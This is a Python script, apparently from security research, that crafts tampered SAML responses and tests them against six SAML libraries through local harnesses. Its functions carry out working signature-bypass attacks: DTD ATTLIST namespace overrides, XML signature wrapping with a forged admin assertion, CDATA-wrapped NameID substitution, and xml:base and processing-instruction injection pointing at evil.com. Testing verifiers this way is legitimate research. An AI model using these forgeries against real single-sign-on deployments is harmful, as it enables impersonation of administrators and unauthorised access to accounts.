"""Advanced SAML attack vectors testing."""
import os, json, subprocess, tempfile, sys
from lxml import etree
from signxml import XMLSigner, XMLVerifier
from signxml.algorithms import SignatureConstructionMethod
from cryptography.hazmat.primitives.serialization import load_pem_private_key

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'targets', 'saml_fixtures')
with open(os.path.join(FIXTURES, 'idp_key.pem'), 'rb') as f:
    KEY = load_pem_private_key(f.read(), password=None)
with open(os.path.join(FIXTURES, 'idp_cert.pem'), 'rb') as f:
    CERT = f.read()

SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
SAMLP = "urn:oasis:names:tc:SAML:2.0:protocol"
CWD = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))

TARGETS = {
    "signxml": ["python", "targets/saml_signxml.py"],
    "python3-saml": ["python", "targets/saml_python3saml.py"],
    "xml-crypto": ["node", "targets/saml_xmlcrypto.js"],
    "node-saml": ["node", "targets/saml_nodesaml.js"],
    "ruby-saml": ["C:/Ruby32-x64/bin/ruby.exe", "targets/saml_rubysaml.rb"],
    "php-saml": [
        "C:/Users/dmbs3/AppData/Local/Microsoft/WinGet/Packages/"
        "PHP.PHP.8.3_Microsoft.Winget.Source_8wekyb3d8bbwe/php.exe",
        "targets/saml_phpsaml.php",
    ],
}


def test_all(xml_bytes, label):
    print(f"\n--- {label} ---")
    with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='wb') as f:
        f.write(xml_bytes)
        tmp = f.name
    for name, cmd in TARGETS.items():
        try:
            proc = subprocess.run(
                cmd + [tmp], capture_output=True, text=True, timeout=10,
                cwd=CWD, env={**os.environ, 'PYTHONIOENCODING': 'utf-8'},
            )
            data = json.loads(proc.stdout.strip().split('\n')[-1])
            sig = data.get('signature_valid', '?')
            subj = data.get('subject', 'N/A') or 'N/A'
            cnt = data.get('assertion_count', '?')
            err = (data.get('signature_error') or '')[:60]
            print(f"  {name:15s}: sig={sig!s:5s} subj={subj:30s} cnt={cnt} {err}")
        except Exception as e:
            print(f"  {name:15s}: ERROR {str(e)[:60]}")
    os.unlink(tmp)


def sign(nameid="user@example.com", aid="_t1"):
    a = etree.fromstring(
        f'<saml:Assertion xmlns:saml="{SAML}" Version="2.0" ID="{aid}" '
        f'IssueInstant="2026-03-01T00:00:00Z">'
        f'<saml:Issuer>https://idp.example.com</saml:Issuer>'
        f'<saml:Subject>'
        f'<saml:NameID>{nameid}</saml:NameID>'
        f'<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        f'<saml:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00Z" '
        f'Recipient="https://sp.example.com/acs"/>'
        f'</saml:SubjectConfirmation>'
        f'</saml:Subject>'
        f'<saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">'
        f'<saml:AudienceRestriction><saml:Audience>https://sp.example.com</saml:Audience>'
        f'</saml:AudienceRestriction></saml:Conditions>'
        f'<saml:AuthnStatement AuthnInstant="2026-03-01T00:00:00Z">'
        f'<saml:AuthnContext><saml:AuthnContextClassRef>'
        f'urn:oasis:names:tc:SAML:2.0:ac:classes:Password'
        f'</saml:AuthnContextClassRef></saml:AuthnContext>'
        f'</saml:AuthnStatement>'
        f'</saml:Assertion>'.encode()
    )
    s = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#',
    )
    return etree.tostring(s.sign(a, key=KEY, cert=CERT))


def wrap(assertion_bytes):
    if isinstance(assertion_bytes, bytes):
        inner = assertion_bytes.decode()
    else:
        inner = assertion_bytes
    return (
        f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<samlp:Response xmlns:samlp="{SAMLP}" xmlns:saml="{SAML}" '
        f'ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z" '
        f'Destination="https://sp.example.com/acs">'
        f'<saml:Issuer>https://idp.example.com</saml:Issuer>'
        f'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>'
        f'</samlp:Status>'
        f'{inner}'
        f'</samlp:Response>'
    ).encode()


# ============================================================
# ATTACK A: DTD ATTLIST multi-element NS override
# ============================================================
def attack_multi_attlist():
    print("\n=== ATTACK A: DTD multi-ATTLIST NS override ===")
    signed = sign(nameid="admin@example.com")
    # Remove saml NS from assertion
    tampered = signed.replace(
        b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"', b'', 1
    )
    response = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE samlp:Response ['
        b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
        b'<!ATTLIST saml:Issuer xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
        b'<!ATTLIST saml:Subject xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
        b'<!ATTLIST saml:NameID xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
        b']>'
        b'<samlp:Response xmlns:samlp="' + SAMLP.encode() + b'" '
        b'xmlns:saml="urn:wrong" '
        b'ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z" '
        b'Destination="https://sp.example.com/acs">'
        b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
        b'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
        + tampered +
        b'</samlp:Response>'
    )

    # signxml direct
    try:
        result = XMLVerifier().verify(response, x509_cert=CERT)
        ns = result.signed_xml.find('.//{%s}NameID' % SAML)
        print(f"  signxml direct: sig=VALID nameid={ns.text if ns is not None else 'N/A'}")
    except Exception as e:
        print(f"  signxml direct: sig=FAIL  err={str(e)[:80]}")

    test_all(response, "Multi-ATTLIST (Response xmlns:saml=wrong, DTD restores on children)")


# ============================================================
# ATTACK B: xml:base injection
# ============================================================
def attack_xmlbase():
    print("\n=== ATTACK B: xml:base injection ===")
    signed = sign(nameid="user@example.com")

    # Add xml:base to assertion — does exc-c14n include it?
    tampered = signed.replace(
        b'<saml:Assertion ',
        b'<saml:Assertion xml:base="http://evil.com/" ',
    )

    # signxml direct
    try:
        result = XMLVerifier().verify(tampered, x509_cert=CERT)
        print("  signxml direct: sig=VALID (xml:base NOT in exc-c14n scope!)")
    except Exception as e:
        print(f"  signxml direct: sig=FAIL  err={str(e)[:80]}")

    response = wrap(tampered)
    test_all(response, "xml:base injection on Assertion element")


# ============================================================
# ATTACK C: CDATA section wrapping
# ============================================================
def attack_cdata():
    print("\n=== ATTACK C: CDATA wrapping ===")
    signed = sign(nameid="user@example.com")
    tampered = signed.replace(
        b'>user@example.com</saml:NameID>',
        b'><![CDATA[admin@example.com]]></saml:NameID>',
    )

    try:
        result = XMLVerifier().verify(tampered, x509_cert=CERT)
        ns = result.signed_xml.find('.//{%s}NameID' % SAML)
        print(f"  signxml direct: sig=VALID nameid={ns.text if ns is not None else 'N/A'}")
    except Exception as e:
        print(f"  signxml direct: sig=FAIL  err={str(e)[:80]}")

    response = wrap(tampered)
    test_all(response, "CDATA wrapping NameID content")


# ============================================================
# ATTACK D: DTD ATTLIST + XSW (evil assertion first, correct NS)
# Response-level saml: ns is wrong, evil has inline correct NS,
# signed assertion gets NS from DTD
# ============================================================
def attack_dtd_xsw_advanced():
    print("\n=== ATTACK D: DTD ATTLIST + XSW advanced ===")
    signed = sign(nameid="user@example.com", aid="_legit_001")

    # Tamper signed assertion: change its inline NS to uppercase
    tampered = signed.replace(
        b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"',
        b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion"',
        1,
    )

    evil = (
        f'<saml:Assertion xmlns:saml="{SAML}" Version="2.0" '
        f'ID="_evil_001" IssueInstant="2026-03-01T00:00:00Z">'
        f'<saml:Issuer>https://idp.example.com</saml:Issuer>'
        f'<saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>'
        f'</saml:Assertion>'
    )

    response = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE samlp:Response ['
        b'<!ATTLIST saml:Assertion xmlns:saml CDATA "urn:oasis:names:tc:SAML:2.0:assertion">'
        b']>'
        b'<samlp:Response xmlns:samlp="' + SAMLP.encode() + b'" '
        b'xmlns:saml="urn:oasis:names:tc:SAML:2.0:Assertion" '
        b'ID="_resp_001" Version="2.0" IssueInstant="2026-03-01T00:00:00Z" '
        b'Destination="https://sp.example.com/acs">'
        b'<saml:Issuer>https://idp.example.com</saml:Issuer>'
        b'<samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
        + evil.encode() + tampered +
        b'</samlp:Response>'
    )

    # signxml direct
    try:
        result = XMLVerifier().verify(response, x509_cert=CERT)
        ns = result.signed_xml.find('.//{%s}NameID' % SAML)
        print(f"  signxml direct: sig=VALID nameid={ns.text if ns is not None else 'N/A'}")
        print("  (signxml extracts from signed element, not first assertion)")
    except Exception as e:
        print(f"  signxml direct: sig=FAIL  err={str(e)[:80]}")

    test_all(response, "DTD+XSW: evil(correct NS, first) + signed(wrong NS, DTD-fixed)")


# ============================================================
# ATTACK E: DTD ATTLIST + Audience override
# ============================================================
def attack_dtd_audience():
    print("\n=== ATTACK E: DTD ATTLIST attribute value injection ===")
    signed = sign(nameid="user@example.com")
    # DTD can add default attributes (not just xmlns)
    # Try adding a custom attribute via DTD
    response = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<!DOCTYPE samlp:Response ['
        b'<!ATTLIST saml:NameID Format CDATA "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
        b'<!ATTLIST saml:Assertion Version CDATA "2.0">'
        b']>'
        + wrap(signed)
    )
    # This won't change behavior much, but let's see if any library chokes
    test_all(response, "DTD ATTLIST default attribute injection (Format on NameID)")


# ============================================================
# ATTACK F: Signature wrapping via processing instruction
# ============================================================
def attack_pi_injection():
    print("\n=== ATTACK F: Processing instruction injection ===")
    signed = sign(nameid="user@example.com")
    # Inject PI before Signature — affects firstChild in some parsers
    tampered = signed.replace(
        b'<ds:Signature ',
        b'<?xml-stylesheet type="text/xsl" href="http://evil.com/x.xsl"?><ds:Signature ',
    )
    response = wrap(tampered)
    test_all(response, "PI injection before Signature element")


if __name__ == '__main__':
    attacks = {
        'multi_attlist': attack_multi_attlist,
        'xmlbase': attack_xmlbase,
        'cdata': attack_cdata,
        'dtd_xsw': attack_dtd_xsw_advanced,
        'dtd_audience': attack_dtd_audience,
        'pi': attack_pi_injection,
    }

    selected = sys.argv[1:] if len(sys.argv) > 1 else attacks.keys()
    for name in selected:
        if name in attacks:
            try:
                attacks[name]()
            except Exception as e:
                print(f"\n[!] {name} failed: {e}")
                import traceback
                traceback.print_exc()
